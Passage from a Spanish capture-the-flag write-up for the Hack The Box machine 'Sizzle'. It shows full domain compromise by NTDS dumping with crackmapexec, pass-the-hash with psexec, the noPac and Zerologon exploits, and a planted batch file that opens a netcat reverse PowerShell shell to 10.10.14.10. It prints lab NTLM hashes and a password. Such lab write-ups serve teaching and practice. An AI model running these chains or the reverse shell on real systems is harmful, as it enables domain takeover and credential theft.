+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">amanda</code> ahora deberia ser administrador del dominio por lo que con crackmapexec nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> por lo que podemos dumpear el <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u amanda -p Ashare1972 --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\amanda:Ashare1972 </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:c1991b0932d4125a3681d8afffd17c9e:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> haciendo un passthehash podemos autenticarnos con <code class="language-plaintext highlighter-rouge">psexec</code> y obtener una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">htb.local/Administrator@sizzle.htb.local -hashes :f6b7160bfc91823792e0ac3a162c9267  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file PZQqHJdn.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service NaUn on sizzle.htb.local.....
+[*] Starting service NaUn.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+3b7**************************bd7
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra2-administrator">
+<br><h3 class="post-title">Extra 2 - Administrator</h3><br>
+
+<p class="plain-text">Por alguna razón y sin ningun sentido en el directorio <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code> encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">file.txt</code> que tiene hashes de algunos usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\System32> </span><span class="am">dir </span><span class="p">*.txt
+
+    Directory: C:\Windows\System32
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/11/2018  11:15 PM            996 file.txt
+-a----        7/16/2016   9:20 AM           1649 WindowsCodecsRaw.txt
+
+PS C:\Windows\System32> </span><span class="am">type </span><span class="p">file.txt
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::  
+
+Domain    User  ID  Hash
+------    ----  --  ----
+HTB.LOCAL Guest 501 -
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+
+PS C:\Windows\System32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que el usuario <code class="language-plaintext highlighter-rouge">mrlky</code> tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> asi que con su hash NT tambien podemos explotarlo y ganar acceso nuevamente haciendo uso de <code class="language-plaintext highlighter-rouge">psexec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u mrlky -H bceef4f6fe9c026d1d8dec8dce48adef --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\mrlky:bceef4f6fe9c026d1d8dec8dce48adef 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:c1991b0932d4125a3681d8afffd17c9e:::</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">htb.local/Administrator@sizzle.htb.local -hashes :f6b7160bfc91823792e0ac3a162c9267  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file PZQqHJdn.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service NaUn on sizzle.htb.local.....
+[*] Starting service NaUn.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+3b7**************************bd7
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra3-administrator">
+<br><h3 class="post-title">Extra 3 - Administrator</h3><br>
+
+<p class="plain-text">Otra curiosidad es que tenemos capacidad de acceder al directorio <code class="language-plaintext highlighter-rouge">Documents</code> del usuario Administrator, encontramos un script <code class="language-plaintext highlighter-rouge">clean.bat</code> y al revisar los privilegios usando icacls vemos que <code class="language-plaintext highlighter-rouge">amanda</code> tiene privilegios <code class="language-plaintext highlighter-rouge">F</code> o Full sobre este archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\Administrator\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/10/2018   6:11 PM             79 clean.bat  
+
+PS C:\Users\Administrator\Documents> </span><span class="am">icacls </span><span class="p">clean.bat
+clean.bat NT AUTHORITY\SYSTEM:(I)(F)
+          BUILTIN\Administrators:(I)(F)
+          HTB\Administrator:(I)(F)
+          HTB\amanda:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Haremos 2 cosas, primero subir <code class="language-plaintext highlighter-rouge">netcat.exe</code> a un directorio donde se pueda ejecutar y la otra modificar el <code class="language-plaintext highlighter-rouge">.bat</code> para que cuando se ejecute nos envie una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\Temp> </span><span class="am">curl </span><span class="p">10.10.14.10/netcat.exe </span><span class="c1">-o </span><span class="p">netcat.exe
+PS C:\Windows\Temp></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">echo </span><span class="az">"C:\Windows\Temp\netcat.exe -e powershell 10.10.14.10 443" </span><span class="p">> clean.bat  
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">clean.bat
+C:\Windows\Temp\netcat.exe -e powershell 10.10.14.10 443
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de unos minutos se ejecuta nuevamente la tarea y ejecutara el <code class="language-plaintext highlighter-rouge">clean.bat</code> que modificamos y nos enviara una powershell como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.103 
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+3b7**************************bd7
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra4-administrator">
+<br><h3 class="post-title">Extra 4 - Administrator</h3><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a>, al explotarlo indicando el parametro <code class="language-plaintext highlighter-rouge">-shell</code> nos otorgara una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente en el <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q python3 noPac.py htb.local/amanda:Ashare1972 -shell
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target sizzle.htb.local
+[*] Total Domain Admins 2
+[*] will try to impersonate Administrator
+[*] Adding Computer Account "WIN-2VNU7LKCDRM$"
+[*] MachineAccount "WIN-2VNU7LKCDRM$" password = SQ0pX1aXi670
+[*] Successfully added machine account WIN-2VNU7LKCDRM$ with password SQ0pX1aXi670.
+[*] WIN-2VNU7LKCDRM$ object = CN=WIN-2VNU7LKCDRM,CN=Computers,DC=HTB,DC=LOCAL
+[*] WIN-2VNU7LKCDRM$ sAMAccountName == sizzle
+[*] Saving a DC's ticket in sizzle.ccache
+[*] Reseting the machine account to WIN-2VNU7LKCDRM$
+[*] Restored WIN-2VNU7LKCDRM$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in Administrator.ccache
+[*] Rename ccache to Administrator_sizzle.htb.local.ccache
+[*] Attempting to del a computer with the name: WIN-2VNU7LKCDRM$
+[-] Delete computer WIN-2VNU7LKCDRM$ Failed! Maybe the current user does not have permission.  
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+3b7**************************bd7
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra5-administrator">
+<br><h3 class="post-title">Extra 5 - Administrator</h3><br>
+
+<p class="plain-text">Como alternativa podemos ejecutar la vuln de <a href="https://github.com/dirkjanm/CVE-2020-1472">zerologon</a> hacia el DC, el servidor es vulnerable y logramos cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> del equipo por una cadena vacia</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">cve-2020-1472-exploit.py SIZZLE 10.10.10.103 
+Performing authentication attempts...
+==========================================================================  
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Autenticandonos como el equipo <code class="language-plaintext highlighter-rouge">SIZZLE$</code> con una cadena vacia como contraseña podemos hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> y ver los hashes NT de todos los usuarios del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u SIZZLE$ -p </span><span class="am">'' </span><span class="p">--ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\SIZZLE$: 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> haciendo un passthehash podemos autenticarnos con <code class="language-plaintext highlighter-rouge">psexec</code> y obtener una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">htb.local/Administrator@sizzle.htb.local -hashes :f6b7160bfc91823792e0ac3a162c9267  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file PZQqHJdn.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service NaUn on sizzle.htb.local.....
+[*] Starting service NaUn.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+3b7**************************bd7
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
